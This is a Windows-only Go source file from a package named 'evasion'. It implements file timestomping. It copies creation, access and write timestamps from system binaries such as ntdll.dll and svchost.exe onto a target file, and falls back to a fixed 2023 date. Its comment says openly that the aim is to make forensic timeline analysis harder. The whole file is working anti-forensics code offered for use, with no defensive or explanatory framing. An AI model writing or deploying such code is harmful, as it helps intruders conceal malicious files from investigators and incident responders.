//go:build windows
// +build windows

package evasion

import (
	"os"
	"path/filepath"

	"golang.org/x/sys/windows"
)

// StompTimestamp copies the creation/write/access times from a reference
// system file onto targetPath, making forensic timeline analysis harder.
// If the reference file cannot be read, falls back to a fixed plausible date.
func StompTimestamp(targetPath string) {
	ref := pickReferenceFile(targetPath)
	var cTime, aTime, wTime windows.Filetime
	if ref != "" {
		if t, err := readFileTimes(ref); err == nil {
			cTime, aTime, wTime = t[0], t[1], t[2]
		}
	}
	if cTime.LowDateTime == 0 {
		// Fallback: 2023-06-15 10:00:00 UTC expressed as FILETIME
		const ft2023 uint64 = 133307448000000000
		cTime = windows.Filetime{
			LowDateTime:  uint32(ft2023 & 0xFFFFFFFF),
			HighDateTime: uint32(ft2023 >> 32),
		}
		aTime, wTime = cTime, cTime
	}
	setFileTimes(targetPath, cTime, aTime, wTime)
}

// pickReferenceFile returns a nearby system file whose timestamps are plausible
// for the directory that targetPath lives in.
func pickReferenceFile(targetPath string) string {
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	candidates := []string{
		filepath.Join(sysRoot, `System32\ntdll.dll`),
		filepath.Join(sysRoot, `System32\kernel32.dll`),
		filepath.Join(sysRoot, `System32\svchost.exe`),
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return ""
}

// readFileTimes returns [creationTime, accessTime, writeTime] for path.
func readFileTimes(path string) ([3]windows.Filetime, error) {
	p16, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return [3]windows.Filetime{}, err
	}
	h, err := windows.CreateFile(p16,
		windows.GENERIC_READ, windows.FILE_SHARE_READ, nil,
		windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return [3]windows.Filetime{}, err
	}
	defer windows.CloseHandle(h)
	var cTime, aTime, wTime windows.Filetime
	err = windows.GetFileTime(h, &cTime, &aTime, &wTime)
	return [3]windows.Filetime{cTime, aTime, wTime}, err
}

// setFileTimes applies the given timestamps to the file at path.
func setFileTimes(path string, cTime, aTime, wTime windows.Filetime) {
	p16, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	h, err := windows.CreateFile(p16,
		windows.FILE_WRITE_ATTRIBUTES, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING, windows.FILE_FLAG_BACKUP_SEMANTICS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(h)
	_ = windows.SetFileTime(h, &cTime, &aTime, &wTime)
}
